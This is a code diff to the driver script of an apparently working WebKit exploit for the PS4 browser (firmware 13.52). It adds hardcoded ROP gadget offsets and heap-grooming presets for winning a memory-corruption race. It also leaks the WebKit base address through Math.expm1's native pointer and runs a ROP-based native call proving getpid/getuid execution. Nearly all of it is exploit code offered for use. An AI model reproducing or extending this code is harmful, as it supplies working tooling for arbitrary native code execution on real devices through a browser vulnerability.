@@ -1,6 +1,20 @@
 import { int64 } from "./int64.js";
 import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";
 import { installWindowP, pairStatus } from "./mem.js";
+import { runGetpidProof } from "./native_call.js";
+
+const BUILD_ID = "rw-20250827a";
+const HW_GADGETS_1352 = {
+    wk_POP_RDI_RET: 0x4be55,
+    wk_POP_RSI_RET: 0x7acb3,
+    wk_POP_RDX_RET: 0x30b1e9,
+    wk_POP_RCX_RET: 0xeaf246,
+    wk_POP_RAX_RET: 0x3424a,
+    wk_POP_R8_RET:  0x5d185,
+    wk_POP_R9_RET:  0x9b288b,
+    wk_LEAVE_RET:   0xf195b,
+    wk_expm1_builtin: 0xeb6350,
+};
 
 const params = new URLSearchParams(location.search);
 const lines = [];
@@ -9,12 +23,78 @@ const pointers = [];
 let busy = false;
 let ready = false;
 let exploit = null;
+let raceAttempt = 0;
+let lengthMissStreak = 0;
 
-const LOG_MAX = 200;
-const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SSV-|READ-PRIMITIVE|COMPOSITION|PRIMITIVE-OK|PAIR-STATUS|AUTO-RETRY|ROUND|MISS/i;
+const LOG_MAX = 300;
+const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|HINT-GROOM/i;
+
+const GROOM_PRESETS = {
+    default: { g: [] },
+    lite: { g: ["drain:256", "drainsz:32768", "slab:2097152"] },
+    "384": { g: ["drain:384", "drainsz:32768", "slab:2097152"] },
+    "512": { g: ["drain:512", "drainsz:32768", "slab:2097152"] },
+    max: {
+        g: [
+            "drain:512", "drainsz:65536", "slab:4194304",
+            "bfly:528384", "early:458752", "guard:589824",
+            "pred:524288", "final:524288",
+        ],
+    },
+};
+
+function currentGroomKey() {
+    const gs = params.getAll("g");
+    if (gs.length === 0) return "default";
+    for (const key of Object.keys(GROOM_PRESETS)) {
+        if (key === "default") continue;
+        const preset = GROOM_PRESETS[key];
+        if (preset.g.length !== gs.length) continue;
+        let match = true;
+        for (let i = 0; i < preset.g.length; i++) {
+            if (gs[i] !== preset.g[i]) { match = false; break; }
+        }
+        if (match) return key;
+    }
+    return "custom";
+}
+
+function groomBootLine() {
+    const key = currentGroomKey();
+    const gs = params.getAll("g");
+    if (key === "custom") return "groom=custom (" + gs.join(", ") + ")";
+    if (key === "default") return "groom=default (core 384 drain)";
+    return "groom=" + key;
+}
+
+function reloadWithGroomPreset(key) {
+    const preset = GROOM_PRESETS[key];
+    if (!preset) return;
+    const url = new URL(location.href);
+    url.searchParams.delete("g");
+    url.searchParams.delete("slots");
+    for (let i = 0; i < preset.g.length; i++)
+        url.searchParams.append("g", preset.g[i]);
+    location.href = url.toString();
+}
+
+function wireGroomBar() {
+    const key = currentGroomKey();
+    const nodes = document.querySelectorAll("[data-groom]");
+    for (let i = 0; i < nodes.length; i++) {
+        const el = nodes[i];
+        el.classList.toggle("active", el.getAttribute("data-groom") === key);
+        el.addEventListener("click", function () {
+            if (busy) return;
+            const k = el.getAttribute("data-groom");
+            if (k) reloadWithGroomPreset(k);
+        });
+    }
+}
 
 let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn;
-let btnStart, btnRefresh, btnPeek, btnClear;
+let btnStart, btnRefresh, btnNative, btnPeek, btnClear;
+let nativeChain = null;
 
 function $(id) { return document.getElementById(id); }
 
@@ -37,6 +117,7 @@ function state(msg, cls) {
 function setUi() {
     if (btnStart) btnStart.disabled = busy || ready;
     if (btnRefresh) btnRefresh.disabled = busy || !ready;
+    if (btnNative) btnNative.disabled = busy || !ready;
     if (btnPeek) btnPeek.disabled = busy || !ready;
     if (pickPtr) pickPtr.disabled = busy || !ready;
     if (addrIn) addrIn.disabled = busy || !ready;
@@ -84,22 +165,25 @@ function walkCell(p, label, obj) {
     return cell;
 }
 
-function captureNativeChain(p, mFunctionOff) {
+function captureNativeChain(p, mFunctionOff, off) {
     const cell = walkCell(p, "Math.expm1", Math.expm1);
     const mid = read8p(p, cell.add32(0x18));
     if (!mid) return null;
     addPtr("JSFunction (expm1)", mid, "cell+0x18");
-    for (const off of [0x0, 0x8, 0x10, 0x20, 0x28, 0x30, 0x38]) {
-        if (off === mFunctionOff) continue;
-        const q = read8p(p, mid.add32(off));
-        if (q && q.hi > 0) addPtr("JSFunction+0x" + off.toString(16), q, "qword");
-    }
     const nativeFn = read8p(p, mid.add32(mFunctionOff));
     if (nativeFn) {
         addPtr("native code ptr", nativeFn, "m_function / webkit .text");
         try { sessionStorage.setItem("wk-nativeFn", String(nativeFn)); } catch (_) { }
         const q0 = read4p(p, nativeFn);
         if (q0 != null) mark("CODE", "nativeFn first4=0x" + (q0 >>> 0).toString(16));
+        if (off && off.wk_expm1_builtin) {
+            const n = (nativeFn.hi * 0x100000000 + (nativeFn.low >>> 0))
+                - (off.wk_expm1_builtin >>> 0);
+            const webkitBase = new int64(n >>> 0, Math.floor(n / 0x100000000));
+            addPtr("webkitBase (assumed)", webkitBase,
+                "nativeFn - 0x" + off.wk_expm1_builtin.toString(16));
+            try { sessionStorage.setItem("wk-webkitBase", String(webkitBase)); } catch (_) { }
+        }
     }
     return nativeFn;
 }
@@ -188,13 +272,91 @@ function peekAt(addr) {
     mark("PEEK", String(addr));
 }
 
+function loadEffectiveOff() {
+    const detected = offsetsFor(navigator.userAgent);
+    const key = detected.key || "13.52";
+    let off = Object.assign({}, offsetsForKey(key).off || {});
+    try {
+        const cal = sessionStorage.getItem("wk-calibrated");
+        if (cal) off = Object.assign(off, JSON.parse(cal));
+    } catch (_) { }
+    return Object.assign(off, HW_GADGETS_1352);
+}
+
+function captureNativeFnQuick(p, off) {
+    try {
+        const raw = sessionStorage.getItem("wk-nativeFn");
+        if (raw) {
+            const fn = parseAddr(String(raw).replace(/^0x/i, ""));
+            if (fn) return fn;
+        }
+    } catch (_) { }
+    const cell = p.leakval(Math.expm1);
+    return p.read8(p.read8(cell.add32(0x18))
+        .add32(off.wk_JSFunction_m_function || 0x28));
+}
+
+function resolveWebkitBase(off, nativeFn) {
+    try {
+        const raw = sessionStorage.getItem("wk-webkitBase");
+        if (raw) {
+            const b = parseAddr(String(raw).replace(/^0x/i, ""));
+            if (b) return b;
+        }
+    } catch (_) { }
+    if (nativeFn && off.wk_expm1_builtin)
+        return nativeFn.sub32(off.wk_expm1_builtin);
+    return null;
+}
+
+async function runNativeCall() {
+    if (busy || !ready || !window.p) return;
+    busy = true;
+    setUi();
+    const p = window.p;
+    try {
+        const off = loadEffectiveOff();
+        const nativeFn = captureNativeFnQuick(p, off);
+        const webkitBase = resolveWebkitBase(off, nativeFn);
+        if (!webkitBase) {
+            mark("NATIVE-FAIL", "no webkitBase — run index_cal Accept first");
+            state("need cal base", "bad");
+            return;
+        }
+        mark("NATIVE-TRY", "base=" + webkitBase + " build=" + BUILD_ID);
+        if (exploit && exploit.trimExploitDebris)
+            exploit.trimExploitDebris();
+        await new Promise(r => setTimeout(r, 128));
+        if (nativeChain) {
+            nativeChain.disarm();
+            nativeChain = null;
+        }
+        const result = runGetpidProof(p, off, { webkitBase, nativeFn, log: mark });
+        nativeChain = result.chain;
+        if (result.ok) {
+            mark("NATIVE-OK", "getpid=" + result.pid + " getuid=" + result.uid);
+            state("native call OK pid=" + result.pid, "ok");
+        } else {
+            mark("NATIVE-FAIL", "getpid=" + result.pid);
+            state("native call returned pid<=0", "bad");
+        }
+    } catch (err) {
+        mark("NATIVE-FAIL", err.message || String(err));
+        state("native call failed", "bad");
+    } finally {
+        busy = false;
+        setUi();
+    }
+}
+
 async function loadExploit() {
     if (exploit) return exploit;
-    mark("LOAD", "core.js + mem.js");
+    mark("LOAD", "core.js + mem.js + native_call.js");
     const core = await import("./core.js");
     exploit = {
         establishPrimitive: core.establishPrimitive,
         installWindowP,
+        trimExploitDebris: core.trimExploitDebris,
     };
     return exploit;
 }
@@ -205,27 +367,38 @@ function attemptCap() {
     return n > 0 ? n : 0;
 }
 
-async function establishUntilOk(establishPrimitive) {
-    const cap = attemptCap();
-    let round = 0;
-    for (;;) {
-        round++;
-        if (round > 1) mark("ROUND", String(round));
-        state(cap === 0
-            ? "race attempt " + round + " (until success)…"
-            : "race round " + round + "…", "warn");
-        try {
-            return await establishPrimitive({
-                maxAttempts: cap,
-                onEvent: (t, d, a) => (CORE_LOG.test(t) ? mark : () => {})
-                    (t, (a != null ? "[" + a + "] " : "") + (d || ""))
-            });
-        } catch (err) {
-            mark("MISS", String(err.message || err));
-            if (cap > 0 && round >= 3) throw err;
-            await new Promise(r => setTimeout(r, 900));
-        }
+function onRaceEvent(tag, detail) {
+    if (!CORE_LOG.test(tag)) return;
+    mark(tag, detail || "");
+
+    if (tag === "ATTEMPT-START") {
+        raceAttempt++;
+        state("race attempt " + raceAttempt + "…", "warn");
+        if (raceAttempt === 15 || raceAttempt === 30 || raceAttempt === 50)
+            mark("HINT-GROOM", "still missing? close browser fully → reload → tap 512 or max groom");
     }
+
+    if (/COMPOSITION-LENGTH-MISS|SSV-PLACEMENT-MISS|ZERO-HEADER-MISS/.test(tag)) {
+        lengthMissStreak++;
+        if (lengthMissStreak === 8 || lengthMissStreak === 20)
+            mark("HINT-GROOM", "COMPOSITION-LENGTH-MISS = race lost — tap 512 drain or max groom, close browser, reload");
+    }
+
+    if (tag === "READ-PRIMITIVE-PASS")
+        lengthMissStreak = 0;
+}
+
+async function establishOnce(establishPrimitive) {
+    raceAttempt = 0;
+    lengthMissStreak = 0;
+    const cap = attemptCap();
+    mark("ATTEMPTS", cap > 0 ? String(cap) + " per page load" : "unlimited (single run)");
+    mark("NOTE", "close browser fully before Start if prior OOM or long retry session");
+
+    return establishPrimitive({
+        maxAttempts: cap,
+        onEvent: (t, d, a) => onRaceEvent(t, (a != null ? "[" + a + "] " : "") + (d || ""))
+    });
 }
 
 function bufAddr(p, off, ab) {
@@ -278,7 +451,7 @@ async function runRwProof(p, off) {
                 mark(view[0] === 0x600dbabe ? "PASS" : "FAIL", "arraybuffer-write4");
             }
         }
-        captureNativeChain(p, off.wk_JSFunction_m_function || 0x28);
+        captureNativeChain(p, off.wk_JSFunction_m_function || 0x28, off);
     }
 
     try { walkCell(p, "parseFloat", parseFloat); } catch (_) { }
@@ -306,7 +479,15 @@ async function runStart() {
 
     try {
         const { establishPrimitive, installWindowP: installP } = await loadExploit();
-        const carrier = await establishUntilOk(establishPrimitive);
+        let carrier;
+        try {
+            carrier = await establishOnce(establishPrimitive);
+        } catch (err) {
+            if (/gave up/i.test(String(err.message))) {
+                mark("HINT-GROOM", "race lost — close browser fully, reload, tap 512 or max groom, Start again");
+            }
+            throw err;
+        }
 
         installP(carrier, { promote: params.get("promote") === "1" });
         const p = window.p;
@@ -316,7 +497,7 @@ async function runStart() {
         mark("PAIR-STATUS", "state=" + pairStatus.state);
 
         const offKey = detected.key || "13.52";
-        const { off } = offsetsForKey(offKey);
+        const off = loadEffectiveOff();
         const ok = await runRwProof(p, off);
 
         ready = true;
@@ -338,10 +519,28 @@ async function runStart() {
 function refreshMap() {
     if (!ready || !window.p) return;
     pointers.length = 0;
-    const detected = offsetsFor(navigator.userAgent);
-    const { off } = offsetsForKey(detected.key || "13.52");
+    const off = loadEffectiveOff();
     runRwProof(window.p, off);
     mark("REFRESH", pointers.length + " pointers");
+}
+
+function reportErr(err) {
+    const msg = err && err.message ? err.message : String(err);
+    state("error: " + msg, "bad");
+    mark("ERROR", err && err.stack ? err.stack : msg);
+}
+
+function wireClick(el, fn) {
+    if (!el) return;
+    el.addEventListener("click", function () {
+        try {
+            const r = fn();
+            if (r && typeof r.then === "function")
+                r.catch(reportErr);
+        } catch (err) {
+            reportErr(err);
+        }
+    });
 }
 
 function init() {
@@ -353,30 +552,57 @@ function init() {
     addrIn = $("addr-in");
     btnStart = $("btn-start");
     btnRefresh = $("btn-refresh");
+    btnNative = $("btn-native");
     btnPeek = $("btn-peek");
     btnClear = $("btn-clear");
 
-    btnStart.addEventListener("click", () => runStart());
-    btnRefresh.addEventListener("click", () => refreshMap());
-    btnClear.addEventListener("click", () => {
+    if (!outEl || !btnStart) {
+        state("UI missing — open via HTTP(S), not file://", "bad");
+        return;
+    }
+
+    wireClick(btnStart, function () { return runStart(); });
+    wireClick(btnRefresh, refreshMap);
+    wireClick(btnNative, function () { return runNativeCall(); });
+    wireClick(btnClear, function () {
         lines.length = 0;
         if (outEl) outEl.textContent = "";
     });
-    btnPeek.addEventListener("click", () => {
+    wireClick(btnPeek, function () {
         const a = parseAddr(addrIn.value);
         if (!a) { mark("PEEK-FAIL", "bad hex"); return; }
         peekAt(a);
     });
-    pickPtr.addEventListener("change", () => {
-        const i = parseInt(pickPtr.value, 10);
-        if (!(i >= 0) || !pointers[i]) return;
-        addrIn.value = pointers[i].addr.replace(/^0x/i, "");
-    });
+
+    if (pickPtr) {
+        pickPtr.addEventListener("change", function () {
+            const i = parseInt(pickPtr.value, 10);
+            if (!(i >= 0) || !pointers[i]) return;
+            addrIn.value = pointers[i].addr.replace(/^0x/i, "");
+        });
+    }
 
     if (params.has("g")) mark("BOOT", "groom=" + params.getAll("g").join(","));
-    mark("BOOT", "retries=until OK (add ?attempts=6 to cap per round)");
+    else mark("BOOT", groomBootLine());
+    mark("BOOT", "build=" + BUILD_ID + " — native call via Math.expm1 pivot");
+    mark("BOOT", "one establishPrimitive run — internal auto-retry until win");
+    window.addEventListener("beforeunload", function () {
+        if (nativeChain) try { nativeChain.disarm(); } catch (_) { }
+    });
+    wireGroomBar();
     setUi();
-    state("ready — retries race until primitive wins", "");
+    state("ready — pick groom if race keeps missing, then Start", "");
 }
 
-init();
+function bootUi() {
+    try {
+        init();
+    } catch (err) {
+        reportErr(err);
+    }
+}
+
+if (document.readyState === "loading")
+    document.addEventListener("DOMContentLoaded", bootUi);
+else
+    bootUi();
